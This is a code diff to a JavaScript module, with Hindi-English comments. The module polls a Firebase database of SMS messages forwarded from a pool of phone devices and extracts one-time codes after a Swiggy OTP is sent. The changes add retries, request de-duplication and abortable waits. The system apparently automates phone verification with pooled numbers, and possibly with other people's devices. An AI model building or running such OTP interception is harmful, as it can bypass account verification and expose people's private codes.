@@ -50,12 +50,15 @@ export function isFirebaseDisabled() {
 }
 
 export function setFirebaseSource(src) {
+  const prevUrl = _source?.url || '';
   if (!src || typeof src !== 'object' || !String(src.url || '').trim()) {
     _source = null;
+    if (prevUrl) _resetSourceCaches();
     return null;
   }
+  const nextUrl = String(src.url).trim().replace(/\/+$/, '');
   _source = {
-    url: String(src.url).trim().replace(/\/+$/, ''),
+    url: nextUrl,
     auth: String(src.auth || '').trim(),
     clientsPath: String(src.clientsPath || 'clients').trim(),
     messagesPath: String(src.messagesPath || 'messages').trim(),
@@ -63,6 +66,7 @@ export function setFirebaseSource(src) {
     smsPath: String(src.smsPath || 'sms').trim(),
     otpPath: String(src.otpPath || 'otp').trim(),
   };
+  if (nextUrl !== prevUrl) _resetSourceCaches();
   return _source;
 }
 
@@ -126,27 +130,48 @@ export function _firebaseErrorMessage(value) {
   return typeof value.error === 'string' ? value.error.trim() : '';
 }
 
-async function fbGet(path, params = {}, timeoutMs = 30_000) {
+function isTransientFirebaseError(err, status = 0) {
+  if (status === 429 || (status >= 500 && status <= 599)) return true;
+  if (status >= 400 && status < 500) return false;
+  const msg = String(err?.message || '');
+  if (/Firebase (4\d\d|error)\b/.test(msg)) return false;
+  return true;
+}
+
+async function fbGet(path, params = {}, timeoutMs = 30_000, { retries = 0, retryDelayMs = 300 } = {}) {
   // Default timeout 30s — clients.json 1.2MB+ ka ho sakta hai; cold fetch
   // ~11-15s leta hai (12s par pehle TimeoutError aakar pool ko 0 bana deta
   // tha). Halki per-device probes apna chhota timeout de sakti hain taaki ek
   // atki hui request poore scan chunk ko 30s tak hostage na rakhe.
-  const res = await fetch(urlFor(path, params), {
-    signal: AbortSignal.timeout(Math.max(1_000, Number(timeoutMs) || 30_000)),
-  });
-  if (!res.ok) {
-    const txt = await res.text().catch(() => '');
-    const hint = (res.status === 401 || res.status === 400)
-      ? ' — FIREBASE_DB_URL/FIREBASE_DB_AUTH check karein'
-      : '';
-    throw new Error(`Firebase ${res.status} (GET ${cleanPath(path)})${hint} ${txt.slice(0, 120)}`);
+  const maxAttempts = 1 + Math.max(0, Number(retries) || 0);
+  let lastErr = null;
+  for (let attempt = 1; attempt <= maxAttempts; attempt++) {
+    let status = 0;
+    try {
+      const res = await fetch(urlFor(path, params), {
+        signal: AbortSignal.timeout(Math.max(1_000, Number(timeoutMs) || 30_000)),
+      });
+      status = res.status;
+      if (!res.ok) {
+        const txt = await res.text().catch(() => '');
+        const hint = (res.status === 401 || res.status === 400)
+          ? ' — FIREBASE_DB_URL/FIREBASE_DB_AUTH check karein'
+          : '';
+        throw new Error(`Firebase ${res.status} (GET ${cleanPath(path)})${hint} ${txt.slice(0, 120)}`);
+      }
+      const data = await res.json();
+      const firebaseError = _firebaseErrorMessage(data);
+      if (firebaseError) {
+        throw new Error(`Firebase error (GET ${cleanPath(path)}): ${firebaseError.slice(0, 160)}`);
+      }
+      return data;
+    } catch (err) {
+      lastErr = err;
+      if (attempt >= maxAttempts || !isTransientFirebaseError(err, status)) throw err;
+      await new Promise((r) => setTimeout(r, retryDelayMs * attempt));
+    }
   }
-  const data = await res.json();
-  const firebaseError = _firebaseErrorMessage(data);
-  if (firebaseError) {
-    throw new Error(`Firebase error (GET ${cleanPath(path)}): ${firebaseError.slice(0, 160)}`);
-  }
-  return data;
+  throw lastErr;
 }
 
 async function fbPatch(path, obj) {
@@ -319,6 +344,12 @@ export function _parseClientsPool(raw) {
 // Device index (phone → deviceIds) — listPoolNumbers se cache hota hai
 // ---------------------------------------------------------------------------
 let _indexCache = { at: 0, byPhone: new Map() };
+const _inFlightPool = new Map();
+
+function _resetSourceCaches() {
+  _indexCache = { at: 0, byPhone: new Map() };
+  _inFlightPool.clear();
+}
 
 function rebuildIndex(pool) {
   const byPhone = new Map();
@@ -335,7 +366,7 @@ export async function findDeviceIdsForPhone(phone) {
   const fresh = Date.now() - _indexCache.at < 5 * 60_000;
   if (cached && fresh) return [...cached];
   try {
-    const pool = await listPoolNumbers({ useCacheIndex: true });
+    await listPoolNumbers({ useCacheIndex: true });
     return [...(_indexCache.byPhone.get(phone) || [])];
   } catch {
     return cached ? [...cached] : [];
@@ -347,34 +378,46 @@ export async function findDeviceIdsForPhone(phone) {
 // ---------------------------------------------------------------------------
 export async function listPoolNumbers({ useCacheIndex = false, timeoutMs = 30_000 } = {}) {
   const forcedLegacy = _source ? _source.numbersPath : env('FIREBASE_NUMBERS_PATH', '');
+  const sourceKey = `${baseUrl()}|${forcedLegacy || (_source?.clientsPath || env('FIREBASE_CLIENTS_PATH', 'clients'))}`;
+  const existing = _inFlightPool.get(sourceKey);
+  if (existing) return existing;
 
-  if (!forcedLegacy) {
-    const clientsPath = _source?.clientsPath || env('FIREBASE_CLIENTS_PATH', 'clients');
-    let raw = null;
-    try {
-      raw = await fbGet(clientsPath, {}, timeoutMs);
-    } catch (e) {
-      // Missing node Firebase me aam taur par 200/null hota hai. Sirf asal
-      // 404 par legacy fallback do; timeout/network/401/423 (deactivated)
-      // ko chhupa kar "pool khali" mat banao — caller ko exact wajah mile
-      // aur autopilot agla enabled Firebase source try kar sake.
-      if (!/Firebase 404\b/.test(String(e?.message || ''))) throw e;
-      raw = null;
-    }
-    if (raw && typeof raw === 'object') {
-      const pool = _parseClientsPool(raw);
-      if (pool.length) {
-        rebuildIndex(pool);
-        return pool;
+  const job = (async () => {
+    if (!forcedLegacy) {
+      const clientsPath = _source?.clientsPath || env('FIREBASE_CLIENTS_PATH', 'clients');
+      let raw = null;
+      try {
+        raw = await fbGet(clientsPath, {}, timeoutMs, { retries: 1 });
+      } catch (e) {
+        // Missing node Firebase me aam taur par 200/null hota hai. Sirf asal
+        // 404 par legacy fallback do; timeout/network/401/423 (deactivated)
+        // ko chhupa kar "pool khali" mat banao — caller ko exact wajah mile
+        // aur autopilot agla enabled Firebase source try kar sake.
+        if (!/Firebase 404\b/.test(String(e?.message || ''))) throw e;
+        raw = null;
+      }
+      if (raw && typeof raw === 'object') {
+        const pool = _parseClientsPool(raw);
+        if (pool.length) {
+          rebuildIndex(pool);
+          return pool;
+        }
       }
     }
-  }
 
-  const legacyPath = _source?.numbersPath || env('FIREBASE_NUMBERS_PATH', 'numbers');
-  const legacyRaw = await fbGet(legacyPath, {}, timeoutMs);
-  const pool = _parsePool(legacyRaw);
-  rebuildIndex(pool);
-  return pool;
+    const legacyPath = _source?.numbersPath || env('FIREBASE_NUMBERS_PATH', 'numbers');
+    const legacyRaw = await fbGet(legacyPath, {}, timeoutMs, { retries: 1 });
+    const pool = _parsePool(legacyRaw);
+    rebuildIndex(pool);
+    return pool;
+  })();
+
+  _inFlightPool.set(sourceKey, job);
+  try {
+    return await job;
+  } finally {
+    if (_inFlightPool.get(sourceKey) === job) _inFlightPool.delete(sourceKey);
+  }
 }
 
 // clients pool me PATCH nahi karte (device ka status field bachao) — legacy me haan.
@@ -477,36 +520,63 @@ function candidateFrom(idKey, v, via, meta = '') {
 export async function fetchOtpCandidates(phone, opts = {}) {
   const out = [];
   const messagesPath = cleanPath(_source?.messagesPath || env('FIREBASE_MESSAGES_PATH', 'messages'));
+  const timeoutMs = Math.max(2_000, Number(opts.timeoutMs) || 8_000);
+  const limitToLast = Math.max(5, Number(opts.limitToLast) || 25);
+  const forcedLegacy = Boolean(_source ? _source.numbersPath : env('FIREBASE_NUMBERS_PATH', ''));
+  const includeLegacy = Boolean(opts.includeLegacy) || forcedLegacy;
 
   // 1) PRIMARY — device messages node (asli forwarder structure)
-  let deviceIds = Array.isArray(opts.deviceIds) && opts.deviceIds.length
+  const deviceIds = Array.isArray(opts.deviceIds) && opts.deviceIds.length
     ? opts.deviceIds
     : await findDeviceIdsForPhone(phone);
 
-  // Saari reads parallel — pehle ye sequential thi (har poll par ~10 GETs ek
-  // ke peeche ek = 1-2s fuzool latency). Ab saari ek saath fire hoti hain.
-  const deviceNodes = await Promise.all(deviceIds.map(async (deviceId) => {
-    try {
-      return [deviceId, await fbGet(`${messagesPath}/${seg(deviceId)}`, { orderBy: '"$key"', limitToLast: 50 })];
-    } catch { return [deviceId, null]; }
-  }));
-  for (const [deviceId, node] of deviceNodes) {
-    if (!node) continue;
-    const entries = Array.isArray(node)
-      ? node.map((m, i) => [i, m])
-      : (typeof node === 'object' ? Object.entries(node) : []);
-    for (const [k, m] of entries) {
-      const sender = m && typeof m === 'object' ? String(m.sender || '') : '';
-      const c = candidateFrom(`messages/${deviceId}/${k}`, m, 'device', sender);
-      if (c) out.push(c);
+  let anyDeviceNodeFound = false;
+  if (deviceIds.length) {
+    const deviceNodes = await Promise.all(deviceIds.map(async (deviceId) => {
+      try {
+        return [deviceId, await fbGet(
+          `${messagesPath}/${seg(deviceId)}`,
+          { orderBy: '"$key"', limitToLast },
+          timeoutMs
+        )];
+      } catch { return [deviceId, null]; }
+    }));
+    for (const [deviceId, node] of deviceNodes) {
+      if (!node) continue;
+      anyDeviceNodeFound = true;
+      const entries = Array.isArray(node)
+        ? node.map((m, i) => [i, m])
+        : (typeof node === 'object' ? Object.entries(node) : []);
+      for (const [k, m] of entries) {
+        const sender = m && typeof m === 'object' ? String(m.sender || '') : '';
+        const c = candidateFrom(`messages/${deviceId}/${k}`, m, 'device', sender);
+        if (c) out.push(c);
+      }
+    }
+    // Primary clients/messages DB me device node mil gaya ho to har 1.5s poll
+    // par 8 fuzool legacy otp/sms GETs aur poora sms.json download mat karo.
+    if (anyDeviceNodeFound && !includeLegacy) {
+      return out;
     }
   }
 
-  // 2) FAST PATH — seedha OTP code likhne wale forwarder ke liye: otp/<number>
+  // 2 & 3) FAST PATH (otp/<number>) + LEGACY sms/<number> — dono ek saath parallel
   const otpPath = cleanPath(_source?.otpPath || env('FIREBASE_OTP_PATH', 'otp'));
-  const otpNodes = await Promise.all(phoneVariants(phone).map(async (variant) => {
-    try { return [variant, await fbGet(`${otpPath}/${seg(variant)}`)]; } catch { return [variant, null]; }
-  }));
+  const smsPath = cleanPath(_source?.smsPath || env('FIREBASE_SMS_PATH', 'sms'));
+  const variants = phoneVariants(phone);
+  const shouldCheckSms = includeLegacy || !deviceIds.length;
+
+  const [otpNodes, smsNodes] = await Promise.all([
+    Promise.all(variants.map(async (variant) => {
+      try { return [variant, await fbGet(`${otpPath}/${seg(variant)}`, {}, timeoutMs)]; } catch { return [variant, null]; }
+    })),
+    shouldCheckSms
+      ? Promise.all(variants.map(async (variant) => {
+        try { return [variant, await fbGet(`${smsPath}/${seg(variant)}`, {}, timeoutMs)]; } catch { return [variant, null]; }
+      }))
+      : Promise.resolve([]),
+  ]);
+
   for (const [variant, node] of otpNodes) {
     if (node === null || node === undefined) continue;
     if (node && typeof node === 'object' && !Array.isArray(node)) {
@@ -526,11 +596,6 @@ export async function fetchOtpCandidates(phone, opts = {}) {
     }
   }
 
-  // 3) LEGACY sms path (purane shapes)
-  const smsPath = cleanPath(_source?.smsPath || env('FIREBASE_SMS_PATH', 'sms'));
-  const smsNodes = await Promise.all(phoneVariants(phone).map(async (variant) => {
-    try { return [variant, await fbGet(`${smsPath}/${seg(variant)}`)]; } catch { return [variant, null]; }
-  }));
   for (const [variant, node] of smsNodes) {
     if (node === null || node === undefined) continue;
     if (Array.isArray(node)) {
@@ -556,9 +621,11 @@ export async function fetchOtpCandidates(phone, opts = {}) {
   }
 
   // 4) LEGACY flat fallback — { pushId: { phone, body, date } }
-  if (!out.length) {
+  // Sirf tab jab legacy mode ho ya koi deviceId hi na ho (warna har empty poll
+  // par poora sms.json download hokar latency barhata hai).
+  if (!out.length && shouldCheckSms) {
     let flat = null;
-    try { flat = await fbGet(smsPath); } catch { flat = null; }
+    try { flat = await fbGet(smsPath, {}, timeoutMs); } catch { flat = null; }
     const entries = Array.isArray(flat)
       ? flat.map((m, i) => [i, m])
       : (flat && typeof flat === 'object' ? Object.entries(flat) : []);
@@ -971,6 +1038,17 @@ function pickBestCandidate(cands, exclude, sinceTs, acceptAnyAfter) {
   return fresh.slice().sort((a, b) => (b.ts || 0) - (a.ts || 0))[0];
 }
 
+async function sleepWithAbort(ms, bail) {
+  let remaining = Math.max(0, Number(ms) || 0);
+  while (remaining > 0) {
+    if (bail()) return true;
+    const step = Math.min(remaining, 150);
+    await new Promise((r) => setTimeout(r, step));
+    remaining -= step;
+  }
+  return Boolean(bail());
+}
+
 // Swiggy OTP dispatch ke BAAD call karo. Chhota `waitMs` (default 3s — SMS
 // aane ka minimum time), phir `timeoutMs` tak har `pollMs` (1.5s) pe Firebase
 // padho. Snapshot (excludeIds) purane codes se bachata hai, isliye jaldi poll
@@ -983,12 +1061,10 @@ export async function waitForOtpCode(phone, opts = {}) {
   const exclude = normalizeExclude(opts.excludeIds ?? opts.exclude);
   const shouldAbort = typeof opts.shouldAbort === 'function' ? opts.shouldAbort : null;
   const sinceTs = typeof opts.sinceTs === 'number' ? opts.sinceTs : Date.now() - 20_000;
-  const startedAt = Date.now();
 
-  const bail = () => shouldAbort && shouldAbort();
+  const bail = () => Boolean(shouldAbort && shouldAbort());
   if (bail()) return { code: '', aborted: true };
-  if (waitMs > 0) await new Promise((r) => setTimeout(r, waitMs));
-  if (bail()) return { code: '', aborted: true };
+  if (waitMs > 0 && await sleepWithAbort(waitMs, bail)) return { code: '', aborted: true };
 
   const deadline = Date.now() + timeoutMs;
   const acceptAnyAfter = Date.now() + acceptAnyAfterMs;
@@ -1005,9 +1081,12 @@ export async function waitForOtpCode(phone, opts = {}) {
       lastErr = e;
     }
     if (bail()) return { code: '', aborted: true };
-    if (Date.now() >= deadline) {
+    const remainingMs = deadline - Date.now();
+    if (remainingMs <= 0) {
       return lastErr ? { code: '', error: lastErr.message } : { code: '' };
     }
-    await new Promise((r) => setTimeout(r, pollMs));
+    if (await sleepWithAbort(Math.min(pollMs, remainingMs), bail)) {
+      return { code: '', aborted: true };
+    }
   }
 }
